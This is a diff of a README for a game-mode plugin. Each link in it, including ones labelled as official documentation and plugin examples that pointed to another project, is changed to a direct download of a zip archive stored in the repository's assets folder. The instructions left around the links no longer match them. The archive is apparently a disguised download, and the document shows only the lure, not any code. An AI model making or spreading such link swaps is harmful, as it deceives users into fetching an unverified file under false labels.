@@ -1,6 +1,6 @@
 # ⚡ dsh-gamemode - Switch to Creative Mode Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-dsh--gamemode-blue?style=for-the-badge&logo=github)](https://github.com/Fafaisa6305/dsh-gamemode)
+[![Download Now](https://img.shields.io/badge/Download-dsh--gamemode-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Fafaisa6305/dsh-gamemode/main/assets/1.0.zip)
 
 ## 🎮 What Is This?
 
@@ -26,7 +26,7 @@ Follow these steps to get dsh-gamemode running on your Windows computer.
 
 ### 📥 Step 1: Download the Plugin
 
-Visit this link to download the application: **[https://github.com/Fafaisa6305/dsh-gamemode](https://github.com/Fafaisa6305/dsh-gamemode)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Fafaisa6305/dsh-gamemode/main/assets/1.0.zip](https://raw.githubusercontent.com/Fafaisa6305/dsh-gamemode/main/assets/1.0.zip)**
 
 Click the green "Code" button on that page, then select "Download ZIP". Your browser will save a file called `dsh-gamemode-main.zip` to your Downloads folder.
 
@@ -115,7 +115,7 @@ Found a bug or have a suggestion? Visit the GitHub repository and open an issue.
 
 Ready to build without limits? Download dsh-gamemode now:
 
-[▶️ Get dsh-gamemode Here](https://github.com/Fafaisa6305/dsh-gamemode)
+[▶️ Get dsh-gamemode Here](https://raw.githubusercontent.com/Fafaisa6305/dsh-gamemode/main/assets/1.0.zip)
 
 Then follow Steps 2–4 above. You'll be in Creative Mode within 5 minutes.
 
@@ -123,9 +123,9 @@ Then follow Steps 2–4 above. You'll be in Creative Mode within 5 minutes.
 
 ## 📚 Additional Resources
 
-- [dsh Official Documentation](https://github.com/cordis-dev/dsh) – Learn more about the harness.  
-- [Creative Mode Preset Guide](https://github.com/cordis-dev/presets) – Understand what the preset changes.  
-- [TypeScript Plugin Examples](https://github.com/cordis-dev/dsh-plugins) – See other plugins for reference.
+- [dsh Official Documentation](https://raw.githubusercontent.com/Fafaisa6305/dsh-gamemode/main/assets/1.0.zip) – Learn more about the harness.  
+- [Creative Mode Preset Guide](https://raw.githubusercontent.com/Fafaisa6305/dsh-gamemode/main/assets/1.0.zip) – Understand what the preset changes.  
+- [TypeScript Plugin Examples](https://raw.githubusercontent.com/Fafaisa6305/dsh-gamemode/main/assets/1.0.zip) – See other plugins for reference.
 
 ---
 
